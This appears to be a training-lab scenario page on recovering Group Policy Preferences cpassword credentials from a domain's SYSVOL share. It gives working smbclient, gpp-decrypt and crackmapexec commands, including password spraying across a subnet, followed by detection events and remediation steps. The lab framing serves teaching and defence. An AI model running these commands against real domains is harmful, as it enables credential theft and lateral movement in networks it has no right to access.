# Scenario 9 - SYSVOL GPP cpassword (Bonus)

| | |
|---|---|
| **MITRE ATT&CK** | T1552.006 - Unsecured Credentials: Group Policy Preferences |
| **Toggle** | `misconfig.sysvol_creds` |
| **Role** | `misconfig_sysvol` |
| **Foothold** | Any domain user (SYSVOL is world-readable) |

## Objective

Recover a plaintext credential from a Group Policy Preferences `Groups.xml`
file in SYSVOL. The `cpassword` value is AES-encrypted with Microsoft's
publicly-documented key, so it is trivially reversible.

## Seeded configuration

The role creates a `LAB-GPP-Credential` GPO and drops a `Groups.xml` under
SYSVOL containing an AES-encrypted `cpassword` whose plaintext is
`sysvol_gpp_plaintext_password` (`GppBackup!2024` by default). The legacy
`LAB-Legacy-SMBv1` GPO is linked as the scenario's weak-protocol companion.

## Attack walkthrough

```bash
# 1. SYSVOL is readable by all authenticated users.
smbclient //10.10.10.10/SYSVOL '<password>' -U 'corp.contoso.lab\eevans' \
  -c 'recurse ON; prompt OFF; mget *'

# 2. Find and decode every cpassword.
grep -ril 'cpassword' ./SYSVOL | while read -r f; do
  gpp-decrypt "$(grep -oP '(?<=cpassword=")[^"]+' "$f")"
done

# Or with a one-liner over the share:
crackmapexec smb 10.10.10.10 -u eevans -p '<password>' -M gpp_password
```

The recovered credential can be sprayed against the domain
(`crackmapexec smb 10.10.10.0/24 -u <user> -p <recovered>`).

### BloodHound view

SYSVOL exposure is not a graph edge, but the engine's findings section reports
credential-exposure conditions so the report remains complete.

## Detection

- **5145** - Network share access to `\SYSVOL\...\Groups.xml` from an
  unusual account or host.
- **Sysmon 1** - `gpp-decrypt`, `crackmapexec`, or `smbclient` on a workstation.
- Rarely: bulk SMB enumeration events on the DC.

## Remediation

- Delete any GPP items containing `cpassword` (the 2014 MS14-025 patch makes
  them unmanageable, but old XML can persist).
- Search SYSVOL for `cpassword` on a schedule; it should always return nothing.
- Use LAPS/gMSA instead of Group Policy Preferences for local passwords.
- Disable SMBv1 everywhere; remove the `LAB-Legacy-SMBv1` GPO.

## References

- MITRE T1552.006
- Microsoft MS14-025
